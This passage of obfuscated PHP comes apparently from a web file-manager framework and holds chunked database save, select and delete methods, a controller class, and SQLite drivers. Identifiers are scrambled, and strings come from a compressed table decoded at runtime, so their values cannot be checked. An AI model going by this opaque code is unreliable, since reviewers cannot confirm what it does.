(!in_array($õ™±¦î“[432], explode($õ™±¦î“[50], $ÁÛœÉüÅ[2]))) { continue; } switch (trim($ÁÛœÉüÅ[3])) { case $õ™±¦î“[396]: case $õ™±¦î“[397]: $ı¥ÍƒÛ“ = isset($ÁÛœÉüÅ[4]) ? (array) $ÁÛœÉüÅ[4] : array(); array_unshift($ı¥ÍƒÛ“, $Ìà¿÷Ö[$Æªà–ô¾]); if (isset($ÁÛœÉüÅ[4]) && $ÁÛœÉüÅ[4] == $õ™±¦î“[454]) { $ı¥ÍƒÛ“ = array($Ìà¿÷Ö[$Æªà–ô¾]); } if ($õ™±¦î“[396] == $ÁÛœÉüÅ[3]) { $Ìà¿÷Ö[$Æªà–ô¾] = call_user_func_array($ÁÛœÉüÅ[1], $ı¥ÍƒÛ“); } else { $Ìà¿÷Ö[$Æªà–ô¾] = call_user_func_array(array(&$this, $ÁÛœÉüÅ[1]), $ı¥ÍƒÛ“); } break; case $õ™±¦î“[348]: if (isset($Ìà¿÷Ö[$Æªà–ô¾]) && $Ìà¿÷Ö[$Æªà–ô¾]) { $Ìà¿÷Ö[$Æªà–ô¾] = call_user_func_array(array(&$this, $ÁÛœÉüÅ[1]), array($Ìà¿÷Ö[$Æªà–ô¾])); } break; case $õ™±¦î“[351]: $Ìà¿÷Ö[$Æªà–ô¾] = $Ìà¿÷Ö[$ÁÛœÉüÅ[1]]; break; case $õ™±¦î“[369]: $·ÒÕÔû„ = $Ìà¿÷Ö[$Æªà–ô¾]; $·ÒÕÔû„ = self::textDecode($·ÒÕÔû„); $Ìà¿÷Ö[$Æªà–ô¾] = json_decode($·ÒÕÔû„, !0); if (is_null($Ìà¿÷Ö[$Æªà–ô¾])) { $Ìà¿÷Ö[$Æªà–ô¾] = $·ÒÕÔû„; } break; case $õ™±¦î“[398]: if ($Ìà¿÷Ö[$Æªà–ô¾] === $õ™±¦î“[12]) { unset($Ìà¿÷Ö[$Æªà–ô¾]); } break; case $õ™±¦î“[399]: $Ìà¿÷Ö[$Æªà–ô¾] = $ÁÛœÉüÅ[1]; break; default: break; } } } public function saveAll($œêºú , $‰âª½÷ = false) { $£Ğ´ˆ»Ü =& $_SERVER[µÅ˜º…æ]; $öŞÙáøÂ = $this->db; $®¬›ú¶Ï = $this->tablePrefix . $this->tableName; $‚ùÚ•Ë÷ = $this->saveAllChunkMake($œêºú ); $‰âª½÷ = is_array($‰âª½÷) ? $‰âª½÷ : array(); foreach ($‚ùÚ•Ë÷ as $òó®¸Âµ) { $ ïÏœÍ¦ = $£Ğ´ˆ»Ü[12]; $”ë…ã Î = $£Ğ´ˆ»Ü[12]; $™–†¨¡Ä = array(); $õßÌ…œ‡ = array(); foreach ($òó®¸Âµ as $şßã‡Û× => $“æ©ŠÍ¬) { $ ïÏœÍ¦ = $“æ©ŠÍ¬[$£Ğ´ˆ»Ü[455]]; $õßÌ…œ‡[] = $“æ©ŠÍ¬[$£Ğ´ˆ»Ü[456]]; $ñöİ³¨« = $öŞÙáøÂ->parseValue($“æ©ŠÍ¬[$£Ğ´ˆ»Ü[456]]); foreach ($“æ©ŠÍ¬[$£Ğ´ˆ»Ü[457]] as $´‹ŸÄŒ¶ => $ıíÕåàÜ) { if (!$™–†¨¡Ä[$´‹ŸÄŒ¶]) { $™–†¨¡Ä[$´‹ŸÄŒ¶] = array(); } $™–†¨¡Ä[$´‹ŸÄŒ¶][] = $£Ğ´ˆ»Ü[458] . $ñöİ³¨« . $£Ğ´ˆ»Ü[459] . $öŞÙáøÂ->parseValue($ıíÕåàÜ); } } $È±ü×Í• = $ ïÏœÍ¦; $È±ü×Í• = $öŞÙáøÂ->parseKey($È±ü×Í•); foreach ($™–†¨¡Ä as $´‹ŸÄŒ¶ => $İœªœŞø) { $”ë…ã Î .= $£Ğ´ˆ»Ü[285] . $öŞÙáøÂ->parseKey($´‹ŸÄŒ¶) . $£Ğ´ˆ»Ü[460] . $È±ü×Í• . $£Ğ´ˆ»Ü[461]; $”ë…ã Î .= implode($£Ğ´ˆ»Ü[285], $İœªœŞø) . $£Ğ´ˆ»Ü[462]; } $—š­Åğİ = $‰âª½÷; $—š­Åğİ[$ ïÏœÍ¦] = array($£Ğ´ˆ»Ü[7], $õßÌ…œ‡); $õèŞŸ·± = "\x55\120\x44\x41\x54\x45\40\x60{$®¬›ú¶Ï}\140\40\123\105\124\40" . rtrim($”ë…ã Î, $£Ğ´ˆ»Ü[50]) . $£Ğ´ˆ»Ü[285] . $öŞÙáøÂ->parseWhere($—š­Åğİ); $this->execute($õèŞŸ·±); $this->chunkEventCheck(count($òó®¸Âµ)); } $this->chunkEventSet(); } public function saveAllEach($¢ÛßÑ÷³, $µòÔÎ‚Ö = false) { $µ«˜ª“ =& $_SERVER[µÅ˜º…æ]; $ıÂ¨áóî = $this->db; $İ’Ì™ñ– = $this->tablePrefix . $this->tableName; $Ø®Ã¢¿Ó = $this->saveAllChunkMake($¢ÛßÑ÷³); $µòÔÎ‚Ö = is_array($µòÔÎ‚Ö) ? $µòÔÎ‚Ö : array(); foreach ($Ø®Ã¢¿Ó as $šô¦¨ó) { foreach ($šô¦¨ó as $·öÍ¿²û => $×¯œÍòô) { $àÈïÎèÙ = $µ«˜ª“[463]; foreach ($×¯œÍòô[$µ«˜ª“[457]] as $¨Àà‹¢ => $Â§´Ú) { $àÈïÎèÙ .= $ıÂ¨áóî->parseKey($¨Àà‹¢) . $µ«˜ª“[464] . $ıÂ¨áóî->parseValue($Â§´Ú) . $µ«˜ª“[50]; } $Œ¤øë¶† = $µòÔÎ‚Ö; $Œ¤øë¶†[$×¯œÍòô[$µ«˜ª“[455]]] = $×¯œÍòô[$µ«˜ª“[456]]; $¹Ê‰ºã = "\125\x50\x44\101\x54\105\40\140{$İ’Ì™ñ–}\140\40\123\x45\x54\x20" . rtrim($àÈïÎèÙ, $µ«˜ª“[50]) . $µ«˜ª“[465] . $ıÂ¨áóî->parseWhere($Œ¤øë¶†) . $µ«˜ª“[466]; $this->execute($¹Ê‰ºã); } $this->chunkEventCheck(count($šô¦¨ó)); } $this->chunkEventSet(); } private function saveAllChunkMake($ğ¨Ûìïü) { $›ÕÄÊÇâ =& $_SERVER[µÅ˜º…æ]; $Ûû½ı¶ø = self::SQL_WHERE_IN_CHUNK; $ğ¨Ûìïü = is_array($ğ¨Ûìïü) ? $ğ¨Ûìïü : array(); $ÇëÛ½¥ = array(); $É÷Ïç“» = ceil(count($ğ¨Ûìïü) / $Ûû½ı¶ø); for ($¡‰§Öƒ = 0; $¡‰§Öƒ < $É÷Ïç“»; $¡‰§Öƒ++) { $ÅöÕ‰Ë = array(); $Ì’õçÛö = array_slice($ğ¨Ûìïü, $¡‰§Öƒ * $Ûû½ı¶ø, $Ûû½ı¶ø); foreach ($Ì’õçÛö as $µªàßı) { if (!is_array($µªàßı) || count($µªàßı) < 4 || count($µªàßı) % 2 != 0) { continue; } $°§àÎÑ = array(); for ($¹¨¤µÎ³ = 2; $¹¨¤µÎ³ < count($µªàßı); $¹¨¤µÎ³ += 2) { $°§àÎÑ[$µªàßı[$¹¨¤µÎ³]] = $µªàßı[$¹¨¤µÎ³ + 1]; } $ÅöÕ‰Ë[] = array($›ÕÄÊÇâ[455] => $µªàßı[0], $›ÕÄÊÇâ[456] => $µªàßı[1], $›ÕÄÊÇâ[457] => $°§àÎÑ); } $ÇëÛ½¥[] = $ÅöÕ‰Ë; } return $ÇëÛ½¥; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($´‹ä›ò† = false, $¦¢Ìî±´ = false) { $this->_chunkEvent = $´‹ä›ò†; $this->_chunkEventParam = $¦¢Ìî±´; } private function chunkEventCheck($Õîİ¢»Ì) { if (!$this->_chunkEvent) { return; } $Şí Í» = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Şí Í»[$_SERVER[µÅ˜º…æ][467]] = $Õîİ¢»Ì; Hook::trigger($this->_chunkEvent, $Şí Í»); } public function addAll($–ÚË¥¬ƒ, $ß¦ö¹ËÔ = array(), $êÀÈÏ€ = false) { $ÈÚ¶ØøË =& $_SERVER[µÅ˜º…æ]; ignore_timeout(); $”º’ÉÒ´ = self::SQL_WHERE_IN_CHUNK; if (empty($–ÚË¥¬ƒ)) { $this->error = think_lang($ÈÚ¶ØøË[349]); return !1; } $ß¦ö¹ËÔ = $this->_parseOptions($ß¦ö¹ËÔ); foreach ($–ÚË¥¬ƒ as $ø‘¹ÉØØ => $  ÚçµŞ) { $–ÚË¥¬ƒ[$ø‘¹ÉØØ] = $this->_facade($  ÚçµŞ); $this->_beforeInsert($–ÚË¥¬ƒ[$ø‘¹ÉØØ], $ß¦ö¹ËÔ); } if (method_exists($this->db, $ÈÚ¶ØøË[350])) { for ($—®Ô×Èğ = 0; $—®Ô×Èğ < count($–ÚË¥¬ƒ); $—®Ô×Èğ += $”º’ÉÒ´) { $¡Û¤´ø = array_slice($–ÚË¥¬ƒ, $—®Ô×Èğ, $”º’ÉÒ´); if (!is_array($¡Û¤´ø) || count($¡Û¤´ø) == 0) { break; } $´ï¬‚ÔÜ = $this->db->insertAll($¡Û¤´ø, $ß¦ö¹ËÔ, $êÀÈÏ€); $this->chunkEventCheck(count($¡Û¤´ø)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($–ÚË¥¬ƒ as $ø‘¹ÉØØ => $  ÚçµŞ) { $´ï¬‚ÔÜ = $this->db->insert($  ÚçµŞ, $ß¦ö¹ËÔ, $êÀÈÏ€); } $this->commit(); } if (!1 !== $´ï¬‚ÔÜ) { $É¡’Úé = $this->getLastInsID(); if ($É¡’Úé) { return $É¡’Úé; } } return $´ï¬‚ÔÜ; } public function save($€şˆóÚ“ = '', $Âª½¾¥ = array()) { $ó»Ş–›¨ =& $_SERVER[µÅ˜º…æ]; $ÅÅŒ¦¦­ = self::SQL_WHERE_IN_CHUNK; $å·Øµçü = $this->optionsValue(); $×ÅÀìî = $this->findWhereField($å·Øµçü); if (!$×ÅÀìî) { return parent::save($€şˆóÚ“, $Âª½¾¥); } $àå€ú‡Õ = 0; $¬¡¿€’Ê = $å·Øµçü[$ó»Ş–›¨[353]][$×ÅÀìî][1]; $¬¡¿€’Ê = is_array($¬¡¿€’Ê) ? $¬¡¿€’Ê : array(); $ÛËĞ¯‹Ö = count($¬¡¿€’Ê); for ($ã¥”æğü = 0; $ã¥”æğü < $ÛËĞ¯‹Ö; $ã¥”æğü += $ÅÅŒ¦¦­) { $‘ˆ¹çÆ = array_slice($¬¡¿€’Ê, $ã¥”æğü, $ÅÅŒ¦¦­); if (!is_array($‘ˆ¹çÆ) || count($‘ˆ¹çÆ) == 0) { break; } $å·Øµçü[$ó»Ş–›¨[353]][$×ÅÀìî][1] = $‘ˆ¹çÆ; $this->optionsValue($å·Øµçü); $àå€ú‡Õ += parent::save($€şˆóÚ“, $Âª½¾¥); $this->chunkEventCheck(count($‘ˆ¹çÆ)); } $this->chunkEventSet(); return $àå€ú‡Õ; } public function add($÷È¸¬ù = '', $¢ñÌšıİ = array(), $ÇÓ‹œ¡Ë = false) { if ($this->addTaskStatus && is_array($÷È¸¬ù)) { $this->addTaskData[] = $÷È¸¬ù; return; } return parent::add($÷È¸¬ù, $¢ñÌšıİ, $ÇÓ‹œ¡Ë); } public function parseWhereLike($£”Êø‘™, $ÆöÕ¼¨˜ = '', $ô­²ì§ = false, &$ô˜«ëëÒ = false) { $€Î…±ˆ =& $_SERVER[µÅ˜º…æ]; $şÙÆ•®ë = $GLOBALS[$€Î…±ˆ[6]][$€Î…±ˆ[468]]; if (!$şÙÆ•®ë[$€Î…±ˆ[469]]) { return $£”Êø‘™; } if (!in_array($this->tableName, array($€Î…±ˆ[429], $€Î…±ˆ[470], $€Î…±ˆ[471], $€Î…±ˆ[472]))) { return $£”Êø‘™; } if (!is_array($£”Êø‘™)) { return $£”Êø‘™; } $äÛÚÔø¹ = array(); $Èç•ãğø = 0; foreach ($£”Êø‘™ as $ƒ¨¯°©ı => $—ÒŸÂö) { if (is_array($—ÒŸÂö) && count($—ÒŸÂö) == 2 && $—ÒŸÂö[0] == $€Î…±ˆ[473] && is_string($—ÒŸÂö[1]) && substr($—ÒŸÂö[1], 0, 1) == $€Î…±ˆ[474] && substr($—ÒŸÂö[1], strlen($—ÒŸÂö[1]) - 1, 1) == $€Î…±ˆ[474]) { $ô˜«ëëÒ = !0; $Ñöã€Ä = is_string($ƒ¨¯°©ı) ? $ƒ¨¯°©ı : $ÆöÕ¼¨˜; $Ç¨óÉ‹‡ = substr($—ÒŸÂö[1], 1, strlen($—ÒŸÂö[1]) - 2); $Ç¨óÉ‹‡ = $this->db->escapeString($Ç¨óÉ‹‡); if (!strpos($Ñöã€Ä, $€Î…±ˆ[10])) { $Ñöã€Ä = $€Î…±ˆ[475] . $Ñöã€Ä . $€Î…±ˆ[475]; } $À‡Íîàª = $€Î…±ˆ[220] . $Ç¨óÉ‹‡ . $€Î…±ˆ[220]; $Ç¨óÉ‹‡ = str_replace(array($€Î…±ˆ[10], $€Î…±ˆ[476]), $€Î…±ˆ[477], $Ç¨óÉ‹‡); if ($şÙÆ•®ë[$€Î…±ˆ[478]]) { $À‡Íîàª = $€Î…±ˆ[479] . $Ç¨óÉ‹‡ . $€Î…±ˆ[480]; if ($şÙÆ•®ë[$€Î…±ˆ[481]]) { $À‡Íîàª = $€Î…±ˆ[480] . $Ç¨óÉ‹‡ . $€Î…±ˆ[479]; } } $Ä«©ÏŒ = Hook::trigger($€Î…±ˆ[482], $Ç¨óÉ‹‡, $À‡Íîàª); if ($Ä«©ÏŒ) { $À‡Íîàª = $Ä«©ÏŒ; } $äÛÚÔø¹[$Èç•ãğø] = $€Î…±ˆ[483] . $Ñöã€Ä . $€Î…±ˆ[484] . $À‡Íîàª . $€Î…±ˆ[485]; $Èç•ãğø++; continue; } if (is_array($—ÒŸÂö)) { $ÆöÕ¼¨˜ = is_string($ƒ¨¯°©ı) ? $ƒ¨¯°©ı : $ÆöÕ¼¨˜; $—ÒŸÂö = $this->parseWhereLike($—ÒŸÂö, $ÆöÕ¼¨˜, !0, $ô˜«ëëÒ); } if (is_numeric($ƒ¨¯°©ı)) { $äÛÚÔø¹[$Èç•ãğø] = $—ÒŸÂö; $Èç•ãğø++; } else { $äÛÚÔø¹[$ƒ¨¯°©ı] = $—ÒŸÂö; } } if ($ô˜«ëëÒ && !$ô­²ì§) { } return $äÛÚÔø¹; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ÏºêË¼Š = array()) { $êŸö¹ë =& $_SERVER[µÅ˜º…æ]; $ÛÃñ¼±â = self::SQL_WHERE_IN_CHUNK; $¡¿·éŒ— = $this->optionsValue(); $ÄŒÔçß• = $this->findWhereField($¡¿·éŒ—); if (!$ÄŒÔçß• || isset($¡¿·éŒ—[$êŸö¹ë[368]]) || isset($¡¿·éŒ—[$êŸö¹ë[428]])) { return parent::select($ÏºêË¼Š); } $¤èŸŞÕ® = $¡¿·éŒ—[$êŸö¹ë[353]][$ÄŒÔçß•][1]; $¤èŸŞÕ® = is_array($¤èŸŞÕ®) ? $¤èŸŞÕ® : array(); $¸®ßÊù = null; for ($•ÔıÃË» = 0; $•ÔıÃË» < count($¤èŸŞÕ®); $•ÔıÃË» += $ÛÃñ¼±â) { $¶Şï™Ö° = array_slice($¤èŸŞÕ®, $•ÔıÃË», $ÛÃñ¼±â); if (!is_array($¶Şï™Ö°) || count($¶Şï™Ö°) == 0) { break; } $¡¿·éŒ—[$êŸö¹ë[353]][$ÄŒÔçß•][1] = $¶Şï™Ö°; $this->optionsValue($¡¿·éŒ—); $ĞÂßÍ†® = parent::select($ÏºêË¼Š); if (!$ĞÂßÍ†®) { continue; } $¸®ßÊù = is_array($¸®ßÊù) ? $¸®ßÊù : array(); $¸®ßÊù = array_merge($¸®ßÊù, $ĞÂßÍ†®); } return $¸®ßÊù; } public function delete($—Ùœ‚Šã = array()) { $­»ÈÎ»Ô =& $_SERVER[µÅ˜º…æ]; $’ñîµ¯É = self::SQL_WHERE_IN_CHUNK; $æú¯ˆ¬ = $this->optionsValue(); $ĞœŒóé = $this->findWhereField($æú¯ˆ¬); if (!$ĞœŒóé) { return parent::delete($—Ùœ‚Šã); } $ã¾İãĞ = 0; $÷©·±›„ = $æú¯ˆ¬[$­»ÈÎ»Ô[353]][$ĞœŒóé][1]; $÷©·±›„ = is_array($÷©·±›„) ? $÷©·±›„ : array(); for ($÷ûÊîè› = 0; $÷ûÊîè› < count($÷©·±›„); $÷ûÊîè› += $’ñîµ¯É) { $éÈÏ» = array_slice($÷©·±›„, $÷ûÊîè›, $’ñîµ¯É); if (!is_array($éÈÏ») || count($éÈÏ») == 0) { break; } $æú¯ˆ¬[$­»ÈÎ»Ô[353]][$ĞœŒóé][1] = $éÈÏ»; $this->optionsValue($æú¯ˆ¬); $ã¾İãĞ += parent::delete($—Ùœ‚Šã); } return $ã¾İãĞ; } private function findWhereField($‚îÆ´Ì) { $Ø£ â’Ê =& $_SERVER[µÅ˜º…æ]; $÷»©Ü‚ = self::SQL_WHERE_IN_CHUNK; if (!is_array($‚îÆ´Ì) || !is_array($‚îÆ´Ì[$Ø£ â’Ê[353]])) { return !1; } foreach ($‚îÆ´Ì[$Ø£ â’Ê[353]] as $Ì†‹ŞßÔ => $šÃÅ¢…È) { if (is_array($šÃÅ¢…È) && isset($šÃÅ¢…È[0]) && is_string($šÃÅ¢…È[0]) && strtolower($šÃÅ¢…È[0]) == $Ø£ â’Ê[7] && is_array($šÃÅ¢…È[1]) && count($šÃÅ¢…È[1]) > $÷»©Ü‚) { ignore_timeout(); return $Ì†‹ŞßÔ; } } return !1; } public function setMasterDB($©ØŸã”ú = true) { think_config($_SERVER[µÅ˜º…æ][486], $©ØŸã”ú); } } goto b‡È£á¹éè; FßÏŒö—ƒ’: define($_SERVER[µÅ˜º…æ][0], $_SERVER[µÅ˜º…æ][1]); $_SERVER[ß»ÓµËì] = explode($_SERVER[µÅ˜º…æ][2], gzinflate(substr($_SERVER[µÅ˜º…æ][3], 10, -8))); function binCheckEq($ü§°¢Êô, $¢±è¾Í˜) { return $ü§°¢Êô == $¢±è¾Í˜; } goto aá‹†Ê¹÷É; BƒâÒœ›Ë¡: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $®Ñ–Ş»³ =& $_SERVER[µÅ˜º…æ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$®Ñ–Ş»³[6]] =& $config; $this->values[$®Ñ–Ş»³[7]] =& $in; $this->tpl = TEMPLATE . MOD . $®Ñ–Ş»³[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($³—éñïà) { if (1 === func_num_args()) { $this->{$³—éñïà} = new $³—éñïà(); } else { $›¼ÜŸÎ = new ReflectionClass($³—éñïà); $øÑ§•¦† = func_get_args(); array_shift($øÑ§•¦†); $this->{$³—éñïà} = $›¼ÜŸÎ->newInstanceArgs($øÑ§•¦†); } return $this->{$³—éñïà}; } public function routeBind($ˆ´ÇÇ, $Îğâş»ş, $·°¿¢  = 3) { $˜¦ŒıÁî =& $_SERVER[µÅ˜º…æ]; $°¼‘Ç² = $this->in[$˜¦ŒıÁî[9]]; $ˆ´ÇÇ = str_replace($˜¦ŒıÁî[10], $˜¦ŒıÁî[11], trim(trim($ˆ´ÇÇ, $˜¦ŒıÁî[8]), $˜¦ŒıÁî[12])); if (!$ˆ´ÇÇ || count($°¼‘Ç²) <= $·°¿¢ ) { return !1; } $ª¿ôğ®² = !0; $–ˆÜˆÅ¯ = explode($˜¦ŒıÁî[8], $ˆ´ÇÇ); for ($öØÒÓüâ = 0; $öØÒÓüâ < count($–ˆÜˆÅ¯); $öØÒÓüâ++) { if ($–ˆÜˆÅ¯[$öØÒÓüâ] != $°¼‘Ç²[$·°¿¢  + $öØÒÓüâ]) { $ª¿ôğ®² = !1; break; } } if (!$ª¿ôğ®²) { return; } call_user_func_array(array($this, $Îğâş»ş), array()); } public function routeArgs($Ç£¢¾î‰ = 3) { $¬šôö•ë = $this->in[$_SERVER[µÅ˜º…æ][9]]; if (count($¬šôö•ë) <= $Ç£¢¾î‰) { return array(); } $ÄçÁ€û² = array(); for ($·şïèÊé = $Ç£¢¾î‰; $·şïèÊé < count($¬šôö•ë); $·şïèÊé += 2) { $ÄçÁ€û²[$¬šôö•ë[$·şïèÊé]] = $¬šôö•ë[$·şïèÊé + 1]; $this->in[$¬šôö•ë[$·şïèÊé]] = $¬šôö•ë[$·şïèÊé + 1]; } return $ÄçÁ€û²; } protected function assign($İ…¦Ò¾Æ, $•Î¨¹ü) { $this->values[$İ…¦Ò¾Æ] = $•Î¨¹ü; } protected function display($ËÂÀãºù) { ob_end_clean(); extract($this->values); require $this->tpl . $ËÂÀãºù; } } class DbSqliteBase extends Db { public function __construct($ÖÙñî—® = '') { $Ñ ë­€÷ =& $_SERVER[µÅ˜º…æ]; if (!extension_loaded($Ñ ë­€÷[13])) { think_exception(think_lang($Ñ ë­€÷[14]) . $Ñ ë­€÷[15]); } if (!empty($ÖÙñî—®)) { if (!isset($ÖÙñî—®[$Ñ ë­€÷[16]])) { $ÖÙñî—®[$Ñ ë­€÷[16]] = 438; } $this->config = $ÖÙñî—®; if (empty($this->config[$Ñ ë­€÷[17]])) { $this->config[$Ñ ë­€÷[17]] = array(); } } } public function connect($ÇŸ©ºÓÂ = '', $áªñÚÎŸ = 0) { $àÄúŠ¨ª =& $_SERVER[µÅ˜º…æ]; if (!isset($this->linkID[$áªñÚÎŸ])) { if (empty($ÇŸ©ºÓÂ)) { $ÇŸ©ºÓÂ = $this->config; } $ôÅÃ­Ğ‡ = !empty($ÇŸ©ºÓÂ[$àÄúŠ¨ª[17]][$àÄúŠ¨ª[18]]) ? $ÇŸ©ºÓÂ[$àÄúŠ¨ª[17]][$àÄúŠ¨ª[18]] : $this->pconnect; $àÙ¹¿ÅØ = $ôÅÃ­Ğ‡ ? $àÄúŠ¨ª[19] : $àÄúŠ¨ª[20]; $this->linkID[$áªñÚÎŸ] = $àÙ¹¿ÅØ($ÇŸ©ºÓÂ[$àÄúŠ¨ª[21]], $ÇŸ©ºÓÂ[$àÄúŠ¨ª[16]]); if (!$this->linkID[$áªñÚÎŸ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$áªñÚÎŸ], 30000); if (1 != think_config($àÄúŠ¨ª[22])) { unset($this->config); } } return $this->linkID[$áªñÚÎŸ]; } public function free() { $this->queryID = null; } public function query($Í¡ŞË£Ï) { $Šü¡î±§ =& $_SERVER[µÅ˜º…æ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Í¡ŞË£Ï; if ($this->queryID) { $this->free(); } think_action_status($Šü¡î±§[23], 1); think_status($Šü¡î±§[24]); $this->queryID = sqlite_query($this->_linkID, $Í¡ŞË£Ï); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $–Óöıéİ = $this->getAll(); return $–Óöıéİ; } } public function execute($°½ÌÌÈ‰) { $´¡àíøŒ =& $_SERVER[µÅ˜º…æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $°½ÌÌÈ‰; if ($this->queryID) { $this->free(); } think_action_status($´¡àíøŒ[25], 1); think_status($´¡àíøŒ[24]); $şÈ•¤§É = sqlite_exec($this->_linkID, $°½ÌÌÈ‰); $this->debug(); if (!1 === $şÈ•¤§É) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[µÅ˜º…æ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ˆò“÷£ô = sqlite_query($this->_linkID, $_SERVER[µÅ˜º…æ][27]); if (!$ˆò“÷£ô) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ø‰ƒ¦ãŒ = sqlite_query($this->_linkID, $_SERVER[µÅ˜º…æ][28]); if (!$ø‰ƒ¦ãŒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $“¼å¹ª€ = array(); if ($this->numRows > 0) { for ($åèÙ°½´ = 0; $åèÙ°½´ < $this->numRows; $åèÙ°½´++) { $“¼å¹ª€[$åèÙ°½´] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $“¼å¹ª€; } public function getFields($Íú•æÊÄ) { $ˆ¦éœŞÄ =& $_SERVER[µÅ˜º…æ]; $ªÛ”ÔºÏ = $this->query($ˆ¦éœŞÄ[29] . $Íú•æÊÄ . $ˆ¦éœŞÄ[30]); $Ø€Ã—ïå = array(); if ($ªÛ”ÔºÏ) { foreach ($ªÛ”ÔºÏ as $·ŞéÀÀ… => $êàØé¬ƒ) { $Ø€Ã—ïå[$êàØé¬ƒ[$ˆ¦éœŞÄ[31]]] = array($ˆ¦éœŞÄ[32] => $êàØé¬ƒ[$ˆ¦éœŞÄ[31]], $ˆ¦éœŞÄ[33] => $êàØé¬ƒ[$ˆ¦éœŞÄ[34]], $ˆ¦éœŞÄ[35] => (bool) ($êàØé¬ƒ[$ˆ¦éœŞÄ[36]] === $ˆ¦éœŞÄ[12]), $ˆ¦éœŞÄ[37] => $êàØé¬ƒ[$ˆ¦éœŞÄ[38]], $ˆ¦éœŞÄ[39] => strtolower($êàØé¬ƒ[$ˆ¦éœŞÄ[40]]) == $ˆ¦éœŞÄ[41], $ˆ¦éœŞÄ[42] => strtolower($êàØé¬ƒ[$ˆ¦éœŞÄ[43]]) == $ˆ¦éœŞÄ[44]); } } return $Ø€Ã—ïå; } public function getTables($­§ì÷§‹ = '') { $Ğ¬‰Ğèı =& $_SERVER[µÅ˜º…æ]; $áêŒÑ™¬ = $this->query($Ğ¬‰Ğèı[45] . $Ğ¬‰Ğèı[46] . $Ğ¬‰Ğèı[47]); $Ë¯¸ó‡² = array(); foreach ($áêŒÑ™¬ as $×óÀ¤›© => $±Û—ªñ) { $Ë¯¸ó‡²[$×óÀ¤›©] = current($±Û—ªñ); } return $Ë¯¸ó‡²; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $—¨ßøÍ¯ =& $_SERVER[µÅ˜º…æ]; $ë‡š = sqlite_last_error($this->_linkID); $this->error = $ë‡š . $—¨ßøÍ¯[4] . sqlite_error_string($ë‡š); if ($—¨ßøÍ¯[12] != $this->queryStr) { $this->error .= LNG($—¨ßøÍ¯[48]) . $this->queryStr; } think_trace($this->error, $—¨ßøÍ¯[12], $—¨ßøÍ¯[49]); return $this->error; } public function escapeString($õ·á¢Ü) { return sqlite_escape_string($õ·á¢Ü); } public function parseLimit($¾•¤ê£Ü) { $ÒÉ°³õ« =& $_SERVER[µÅ˜º…æ]; $¿ë¦šª = $ÒÉ°³õ«[12]; if (!empty($¾•¤ê£Ü)) { $¾•¤ê£Ü = explode($ÒÉ°³õ«[50], $¾•¤ê£Ü); if (count($¾•¤ê£Ü) > 1) { $¿ë¦šª .= $ÒÉ°³õ«[51] . $¾•¤ê£Ü[1] . $ÒÉ°³õ«[52] . $¾•¤ê£Ü[0] . $ÒÉ°³õ«[53]; } else { $¿ë¦šª .= $ÒÉ°³õ«[51] . $¾•¤ê£Ü[0] . $ÒÉ°³õ«[53]; } } return $¿ë¦šª; } } class DbSqlite3Base extends Db { public function __construct($”€éÙ¥© = '') { $€Ç†‹ºĞ =& $_SERVER[µÅ˜º…æ]; if (!class_exists($€Ç†‹ºĞ[54])) { think_exception(think_lang($€Ç†‹ºĞ[14]) . $€Ç†‹ºĞ[55]); } if (!empty($”€éÙ¥©)) { if (!isset($”€éÙ¥©[$€Ç†‹ºĞ[16]])) { $”€éÙ¥©[$€Ç†‹ºĞ[16]] = 438; } $this->config = $”€éÙ¥©; if (empty($this->config[$€Ç†‹ºĞ[17]])) { $this->config[$€Ç†‹ºĞ[17]] = array(); } } } public function connect($ƒıÇ†‡´ = '', $‡Ñ¯ò©ˆ = 0) { $™Øô€Ù™ =& $_SERVER[µÅ˜º…æ]; if (!isset($this->linkID[$‡Ñ¯ò©ˆ])) { if (empty($ƒıÇ†‡´)) { $ƒıÇ†‡´ = $this->config; } $this->linkID[$‡Ñ¯ò©ˆ] = new SQLite3($ƒıÇ†‡´[$™Øô€Ù™[21]]); if (!$this->linkID[$‡Ñ¯ò©ˆ]) { think_exception($this->linkID[$‡Ñ¯ò©ˆ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$‡Ñ¯ò©ˆ]->busyTimeout(30000); if (1 != think_config($™Øô€Ù™[22])) { unset($this->config); } } return $this->linkID[$‡Ñ¯ò©ˆ]; } public function free() { $this->queryID = null; } public function query($¸Ùå²¢) { $…Œä¯—’ =& $_SERVER[µÅ˜º…æ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¸Ùå²¢; if ($this->queryID) { $this->free(); } think_action_status($…Œä¯—’[23], 1); think_status($…Œä¯—’[24]); $this->queryID = $this->_linkID->query($¸Ùå²¢); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $™ïüñ = $this->getAll(); $this->numRows = count($™ïüñ); return $™ïüñ; } } public function execute($ê¹ÃÀ»‡) { $†°é„Œ‹ =& 